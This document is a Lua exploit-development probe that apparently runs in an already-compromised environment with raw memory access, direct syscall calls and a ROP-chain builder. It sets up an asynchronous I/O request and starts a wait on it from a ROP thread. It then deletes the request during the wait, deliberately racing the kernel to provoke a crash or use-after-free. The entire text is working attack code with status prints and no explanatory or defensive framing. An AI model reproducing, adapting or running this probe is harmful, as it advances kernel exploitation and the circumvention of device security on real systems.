-- CRASH_CLASS: HIGH
-- PROBE 646a: aio_multi_wait on a parked request, deleted underneath it
print("=== PROBE 646a: WAIT ON A PARKED REQUEST, THEN DELETE ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local sc669=mk(669) local sc664=mk(664) local sc662=mk(662) local sc663=mk(663) local sc135=mk(135) local sc4=mk(4)
local sv=memory.alloc(0x10)
local sr=pcall(function() return sc135(uint64(1),uint64(1),uint64(0),uint64(N(sv))) end)
local fa=rd(N(sv)) local fb=rd(N(sv)+4)
print(string.format("[A] pair a=%s b=%s",tostring(fa),tostring(fb)))
if not sr or not fa or not fb or fa<=0 then return end
local aiocb=memory.alloc(0x40)
local buf=memory.alloc(0x400)
local out=memory.alloc(0x40) local chk=memory.alloc(0x40)
for i=0,0x3C,4 do wd(N(aiocb)+i,0) end
wd(N(aiocb),fa) wd(N(aiocb)+4,0)
wq(N(aiocb)+8,uint64(N(buf)))
wq(N(aiocb)+0x10,uint64(0x100))
wq(N(aiocb)+0x18,uint64(0))
local o,r=pcall(function() return sc669(uint64(1),uint64(N(aiocb)),uint64(1),uint64(1),uint64(N(out))) end)
local id=rd(N(out))
print(string.format("[B] create ret=%d id=%s",o and N(r) or -99,tostring(id)))
if not o or N(r)~=0 or not id or id<=0 then return end
local ids=memory.alloc(8)
wd(N(ids),id)
local one=memory.alloc(8)
wd(N(one),0x5A)
pcall(function() sc4(uint64(fb),uint64(N(one)),uint64(1),uint64(0),uint64(0),uint64(0)) end)
wd(N(chk),0x77777777)
pcall(function() sc664(U(N(ids)),uint64(1),uint64(N(chk))) end)
print(string.format("[C] poll after 1 byte = %s",tostring(rd(N(chk)))))
local ts=memory.alloc(0x10)
wq(N(ts),uint64(0)) wq(N(ts)+8,uint64(400000000))
local wout=memory.alloc(0x40)
local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
c:push_syscall_with_ret(mk(663), U(N(ids)), uint64(1), U(N(wout)), U(N(ts)), uint64(0), uint64(0))
local t=thread:new(c)
local t0=os.clock()
t:run(true)
for i=1,200000 do local k=i end
local w0=rd(N(wout))
print(string.format("[D] wait launched, out=%s",tostring(w0)))
wd(N(chk),0x77777777)
local d1,r1=pcall(function() return sc662(U(N(ids)),uint64(1),uint64(N(chk))) end)
print(string.format("[E] delete ret=%s status=%s",tostring(d1 and r1 or "err"),tostring(rd(N(chk)))))
local okj=pcall(function() t:join() end)
print(string.format("[F] join ok=%s wait out=%s",tostring(okj),tostring(rd(N(wout)))))
print(string.format("[G] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] done")
